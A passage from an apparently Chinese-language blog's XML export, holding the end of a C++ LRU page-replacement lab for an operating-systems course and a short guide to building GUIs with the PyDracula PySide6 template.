<span class="keyword">int</span> tem = example.priority[<span class="number">1</span>];</span><br><span class="line">        example.priority[<span class="number">0</span>] = example.priority[<span class="number">0</span>];</span><br><span class="line">        example.priority[<span class="number">1</span>] = example.priority[<span class="number">2</span>];</span><br><span class="line">        example.priority[<span class="number">2</span>] = tem;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (example.priority[<span class="number">2</span>] == j)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> tem = example.priority[<span class="number">2</span>];</span><br><span class="line">        example.priority[<span class="number">0</span>] = example.priority[<span class="number">0</span>];</span><br><span class="line">        example.priority[<span class="number">1</span>] = example.priority[<span class="number">1</span>];</span><br><span class="line">        example.priority[<span class="number">2</span>] = tem;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> tem = example.priority[<span class="number">0</span>];</span><br><span class="line">        example.priority[<span class="number">0</span>] = example.priority[<span class="number">1</span>];</span><br><span class="line">        example.priority[<span class="number">1</span>] = example.priority[<span class="number">2</span>];</span><br><span class="line">        example.priority[<span class="number">2</span>] = tem;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LRU</span><span class="params">(<span class="keyword">int</span> *sequence, process_memory &amp;example)</span>  <span class="comment">//LRU算法处理输入序列</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">bool</span> is_miss = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (sequence[i] == example.block[i][j])    <span class="comment">//命中页块j</span></span><br><span class="line">            &#123;</span><br><span class="line">                example.block[i][j] = sequence[i];</span><br><span class="line">                missing[i] = <span class="literal">false</span>;</span><br><span class="line">                <span class="built_in">priority_rank</span>(example, j);              <span class="comment">//页块j应该是最后被替换的</span></span><br><span class="line">                is_miss=<span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                is_miss = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_miss)               <span class="comment">//未命中</span></span><br><span class="line">        &#123;</span><br><span class="line">            example.block[i][example.priority[<span class="number">0</span>]] = sequence[i]; <span class="comment">//最应该被替换的被替换</span></span><br><span class="line">            missing[i]=<span class="literal">true</span>;</span><br><span class="line">            example.missing_number++;</span><br><span class="line">            <span class="built_in">priority_rank</span>(example, example.priority[<span class="number">0</span>]);    <span class="comment">//因为被替换，优先级调整</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            example.block[i+<span class="number">1</span>][j] =example.block[i][j];    <span class="comment">//继承状态给下一个</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    example.<span class="built_in">percentage_count</span>();                   <span class="comment">//计算未命中率</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//初始化</span></span><br><span class="line">    <span class="built_in">Randomized_Sequence</span>(sequence);               </span><br><span class="line">    process_memory example=<span class="built_in">process_memory</span>();    </span><br><span class="line">    <span class="built_in">display</span>(example);</span><br><span class="line">    <span class="comment">//LRU</span></span><br><span class="line">    <span class="built_in">LRU</span>(sequence,example);</span><br><span class="line">    <span class="built_in">display</span>(example);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="初值以及运行结果"><a href="#初值以及运行结果" class="headerlink" title="初值以及运行结果"></a>初值以及运行结果</h2><p><img src="/2021/12/18/LRU%E9%A1%B5%E9%9D%A2%E7%BD%AE%E6%8D%A2%E7%AE%97%E6%B3%95/image-20211208220357854.png" alt="image-20211208220357854"></p>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>lab</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 PyDracula 制作 GUI</title>
    <url>/2021/12/20/PyDracula/</url>
    <content><![CDATA[<h1 id="使用-PyDracula-制作-GUI"><a href="#使用-PyDracula-制作-GUI" class="headerlink" title="使用 PyDracula 制作 GUI"></a>使用 PyDracula 制作 GUI</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>PyDracula 项目地址：<a href="https://github.com/Wanderson-Magalhaes/Modern_GUI_PyDracula_PySide6_or_PyQt6">Wanderson-Magalhaes/Modern_GUI_PyDracula_PySide6_or_PyQt6 (github.com)</a></p>
<p>效果图</p>
<p><img src="/2021/12/20/PyDracula/112993874-0b647700-9140-11eb-8670-61322d70dbe3.png" alt="PyDracula_Default_Dark"></p>
<p>非常好看的一个界面，我们可以使用它来制作自己需要的GUI</p>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul>
<li>操作系统：kali linux</li>
<li>编辑器：VS code </li>
<li>Python版本： 3.9.2 64-bit</li>
<li>依赖包：PySide6 <ul>
<li>使用pip安装：<code>pip install --user PySide6</code></li>
<li>designer位置：<code>~/.local/lib/python3.9/site-packages/PySide6/designer</code></li>
<li>uic位置：<code>~/.local/lib/python3.9/site-packages/PySide6/Qt/libexec/uic</code></li>
<li>rcc位置：<code>~/.local/lib/python3.9/site-packages/PySide6/Qt/libexec/rcc</code></li>
</ul>
</li>
</ul>
<h3 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h3><p>我们直接将项目clone下来，在环境准备好的前提，我们可以直接运行<code>main.py</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Wanderson-Magalhaes/Modern_GUI_PyDracula_PySide6_or_PyQt6.git</span><br></pre></td></tr></table></figure>

<h4 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h4><ul>
<li><strong>main.py</strong>: 应用程序初始化文件</li>
<li><strong>main.ui</strong>: Qt Designer 界面项目</li>
<li><strong>resouces.qrc</strong>: Qt Designer 资源，可以在这个文件添加你的资源</li>
<li><strong>setup.py</strong>: 安装 cx-Freeze 编译应用程序（为 Windows 配置）</li>
<li><strong>themes/</strong>: 在该目录添加 .qss 主题文件，目前有 light 和 dark 两种主题。</li>
<li><strong>modules/</strong>: 运行 GUI 需要的一些模块<ul>
<li><strong>modules/app_funtions.py</strong>: 在该文件添加应用程序功能</li>
<li><strong>modules/app_settings.py</strong>: 用于配置用户界面的全局变量</li>
<li><strong>modules/resources_rc.py</strong>: 使用命令 <code>~/.local/lib/python3.9/site-packages/PySide6/Qt/libexec/rcc resources.qrc -o resources_rc.py -g python </code>生成，供 main.py 使用</li>
<li><strong>modules/ui_functions.py</strong>: 此处仅添加与用户界面/GUI相关的功能。</li>
<li><strong>modules/ui_main.py</strong>: 与Qt Designer导出的用户界面相关的文件</li>
</ul>
</li>
<li><strong>images/</strong>: 在转换成 .py 文件之前，将所有的图片图标放在这个文件夹下面，然后执行 <code>pyside6-rcc resources.qrc -o resources_rc.py</code></li>
</ul>
<h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p>根据项目中给出的youtube视频<a href="https://youtu.be/9DnaHg4M_AM%EF%BC%8C%E7%BB%93%E5%90%88Readme%E5%92%8C%E6%BA%90%E7%A0%81%EF%BC%8C%E4%B8%BB%E8%A6%81%E6%94%B9%E5%8A%A8%EF%BC%9A">https://youtu.be/9DnaHg4M_AM，结合Readme和源码，主要改动：</a></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>github</tag>
        <tag>PyQt6</tag>
        <tag>PySide6</tag>
      </tags>
  </entry>
</search>
